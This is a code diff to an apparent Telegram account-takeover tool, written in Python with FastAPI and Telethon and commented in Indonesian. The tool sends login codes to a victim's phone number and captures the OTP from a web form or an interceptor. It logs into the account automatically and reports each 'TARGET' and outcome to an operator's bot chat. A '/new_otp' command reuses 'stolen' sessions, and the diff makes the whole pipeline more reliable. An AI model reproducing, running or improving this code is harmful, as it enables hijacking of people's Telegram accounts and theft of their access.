@@ -4,6 +4,11 @@ from telethon.sessions import StringSession
 import asyncio
 import os
 import re
+import logging
+
+# Aktifkan logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 app = FastAPI()
 
@@ -20,19 +25,55 @@ OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 async def start_listener(req: Request):
     data = await req.json()
     phone = data['phone']
+    
+    logger.info(f"[+] Mulai listener untuk {phone}")
 
+    # Buat client sementara
     temp = TelegramClient(StringSession(), API_ID, API_HASH)
+    
+    # PAKSA CONNECT DULU
     await temp.connect()
-    sent = await temp.send_code_request(phone)
-    listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}
+    if not await temp.is_user_authorized():
+        logger.info(f"[+] Client belum login, kirim OTP...")
+    else:
+        logger.warning(f"[!] Client sudah login? (jarang terjadi)")
 
-    @temp.on(events.NewMessage(incoming=True))
-    async def handler(event):
-        if OTP_PATTERN.search(event.message.message):
-            code = OTP_PATTERN.search(event.message.message).group(1)
-            await auto_login(phone, code, source="interceptor")
+    try:
+        # Kirim OTP
+        sent = await temp.send_code_request(phone)
+        logger.info(f"[+] OTP terkirim, hash: {sent.phone_code_hash}")
+        
+        # Simpan ke listening
+        listening[phone] = {
+            'client': temp,
+            'hash': sent.phone_code_hash,
+            'awaiting': True
+        }
 
-    await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
+        # DELAY 2 DETIK BIAR CLIENT SIAP
+        await asyncio.sleep(2)
+
+        # PASANG LISTENER SETELAH SIAP
+        @temp.on(events.NewMessage(incoming=True))
+        async def otp_handler(event):
+            text = event.message.message
+            logger.info(f"[*] Pesan masuk dari {phone}: {text}")
+            
+            match = OTP_PATTERN.search(text)
+            if match:
+                code = match.group(1)
+                logger.info(f"[+] OTP DITEMUKAN: {code}")
+                await auto_login(phone, code, source="interceptor")
+                # Hapus listener
+                temp.remove_event_handler(otp_handler)
+
+        # Kirim notif ke bot
+        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
+        
+    except Exception as e:
+        logger.error(f"[!] Gagal kirim OTP: {str(e)}")
+        await client.send_message(CHAT_ID, f"Gagal kirim OTP ke `{phone}`: {str(e)}")
+    
     return {"success": True}
 
 @app.post("/submit_otp")
@@ -40,12 +81,15 @@ async def submit_otp(req: Request):
     data = await req.json()
     phone = data['phone']
     otp = data['otp']
+    
     if phone in listening:
         await auto_login(phone, otp, source="web")
     return {"success": True}
 
 async def auto_login(phone, code, source="unknown"):
-    if phone not in listening: return
+    if phone not in listening:
+        return
+    
     temp = listening[phone]['client']
     hash_ = listening[phone]['hash']
 
@@ -67,9 +111,11 @@ Phone: `{phone}`
         """.strip()
         await client.send_message(CHAT_ID, msg)
         del listening[phone]
+        
     except Exception as e:
-        await client.send_message(CHAT_ID, f"Gagal: {str(e)}")
+        await client.send_message(CHAT_ID, f"Gagal login {phone}: {str(e)}")
 
+# /new_otp
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     phone = event.pattern_match.group(1)
@@ -88,16 +134,20 @@ async def new_otp(event):
         await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
         
         listening[phone] = {'client': stolen, 'hash': result.phone_code_hash}
+        await asyncio.sleep(2)  # Delay
+        
         @stolen.on(events.NewMessage(incoming=True))
         async def handler(e):
             match = OTP_PATTERN.search(e.message.message)
             if match:
                 code = match.group(1)
                 await event.reply(f"OTP BARU: `{code}`")
+                stolen.remove_event_handler(handler)
+                
     except Exception as e:
         await event.reply(f"Gagal: {str(e)}")
 
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX OTP BOT HIDUP!")
+    print("JINX BOT HIDUP – OTP LANGSUNG MUNCUL!")
